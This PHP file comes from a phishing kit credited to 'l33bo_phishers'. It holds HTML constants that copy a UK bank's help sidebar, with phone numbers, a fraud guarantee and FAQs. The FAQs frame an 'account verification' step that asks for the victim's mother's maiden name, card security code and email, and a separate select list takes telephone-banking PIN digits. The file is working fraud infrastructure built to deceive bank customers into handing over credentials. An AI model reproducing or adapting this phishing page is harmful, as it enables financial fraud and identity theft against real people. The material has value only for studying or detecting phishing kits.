<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
define("verifysecondary", "
<div class='secondary'>
<div class='panel'>
<div class='accordion ui-accordion ui-widget ui-helper-reset' role='tablist'>
<div class='part'>
<h2 class='trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all' role='tab' aria-expanded='false' tabindex='0'>
<span class='ui-icon ui-icon-triangle-1-e'></span><span class='ui-icon ui-icon-triangle-1-e'></span>Contact Us....</h2>
<div class='pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom' role='tabpanel' style='display: none;'>
<div class='paneInner'>
<div class='quickContact'>
<h3>All account related queries</h3>
<p><strong>0345 300 0000</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on +44 1733 347 007.</p>
<p>Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of service.<br><br></p>
<h3>Internet Banking queries</h3>
<p>Technical queries about the Internet Banking service</p>
<p><strong>0345 300 0116</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on&nbsp;+44 2076 499 437.</p>
</div>
</div>
</div>
</div>
<div class='part selected'>
<h2 class='trigger current linkPointer hasLink ui-accordion-header ui-helper-reset' role='tab' aria-expanded='true' tabindex='0'>
<span class='ui-icon ui-icon-triangle-1-s'></span>
<span class='ui-icon ui-icon-triangle-1-e'></span>Help &amp; Support</h2>
<div class='pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active' role='tabpanel'>
<div class='paneInner'>
<span class='showMeMenu'>
<ul class='quickFAQs ui-accordion ui-widget ui-helper-reset' role='tablist'>
<li class='ui-accordion-li-fix'>
<h3 class='qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all' tabindex='0' role='tab' aria-expanded='false'>
<span class='ui-icon ui-icon-triangle-1-e'></span>
<span class='ui-icon ui-icon-triangle-1-e'></span>What is account verification?</h3>
<div class='qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom' role='tabpanel' style='display: none;'>
<p></p><p>Account verification provides you with an extra layer of security which helps safeguard your account information. You will be asked to confirm your personal and account details.</p>
<p></p>
</div>
</li>
<li class='ui-accordion-li-fix'>
<h3 class='qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all' tabindex='0' role='tab' aria-expanded='false'>
<span class='ui-icon ui-icon-triangle-1-e'></span>
<span class='ui-icon ui-icon-triangle-1-e'></span>How long does account verification take?</h3>
<div class='qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom' role='tabpanel' style='display: none;'>
<p></p>
<p>Account verification is easy and should only take about 5 minutes to complete please ensure you have all the information required before you begin.</p><p></p>
</div>
</li>
<li class='ui-accordion-li-fix'>
<h3 class='qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all' tabindex='0' role='tab' aria-expanded='false'>
<span class='ui-icon ui-icon-triangle-1-e'></span><span class='ui-icon ui-icon-triangle-1-e'></span>Where can I find my sort code and account number?</h3>
<div class='qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom' role='tabpanel' style='display: none;'>
<p></p><p>You can find these details on one of your latest statements or on your cheque book.</p>
<p></p>
</div>
</li>
<li class='ui-accordion-li-fix'>
<h3 class='qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all' tabindex='0' role='tab' aria-expanded='false'>
<span class='ui-icon ui-icon-triangle-1-e'></span>
<span class='ui-icon ui-icon-triangle-1-e'></span>Why is it necessary to provide personal information such as my email address, mother maiden name and card security code?</h3>
<div class='qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom' role='tabpanel' style='display: none;'>
<p></p><p>We require this information in order to validate your identity should we need to contact you by email or telephone by providing this information you'll also be able to reset your login details should you forget them, so you can get back online quickly.</p>
<p></p>
</div>
</li>
<li class='ui-accordion-li-fix'><h3 class='qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all' tabindex='0' role='tab' aria-expanded='false'>
<span class='ui-icon ui-icon-triangle-1-e'></span><span class='ui-icon ui-icon-triangle-1-e'></span>What else can I do to protect myself online?</h3>
<div class='qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom' role='tabpanel' style='display: none;'>
<p>Adopting a few good habits can help make sure your personal information stays safe and secure on the internet.&nbsp;<a class='newwin newwin' href='#' tabindex='0'>How can I tell that this site is secure?</a></p>
</div>
</li>
</ul>
<p><a href='#' target='_blank' class='linkBullet linkMore newwin newfaqwin' tabindex='0'>More Help &amp; Support</a></p>
</span>
</div>
</div>
</div>
<div class='subPanel'>
<h3 style='font-size: 1.4em;'>Our Internet Banking Guarantee</h3>
<p>We guarantee to refund your money in the unlikely event you experience fraud with our&nbsp;Internet Banking service &ndash; as long as you've been careful, for example, by taking reasonable steps to keep your security information safe. We protect you with safeguards that meet Industry Standards.</p>
<ul>
<li>Keep your password secure and <strong>do not let anyone else make use of your security details</strong>, even if they share a joint account with you.</li>
<li>Do not let anyone watch you enter your security details and log off after each&nbsp;Internet Banking session.</li>
<li>Carry out regular virus checks on your devices and have the latest operating system and web browser installed.</li>
</ul>
<p>Find out more about how to&nbsp;<a class='newwin' href='#'>protect yourself online</a><strong>.</strong>&nbsp;</p>
</div>
</div>
</div>								
</div>
");
define("telepinselect", "
<option value='-'>Please enter...</option>
<option value='0'>&nbsp;0</option>
<option value='1'>&nbsp;1</option>
<option value='2'>&nbsp;2</option>
<option value='3'>&nbsp;3</option>
<option value='4'>&nbsp;4</option>
<option value='5'>&nbsp;5</option>
<option value='6'>&nbsp;6</option>
<option value='7'>&nbsp;7</option>
<option value='8'>&nbsp;8</option>
<option value='9'>&nbsp;9</option>
");
?>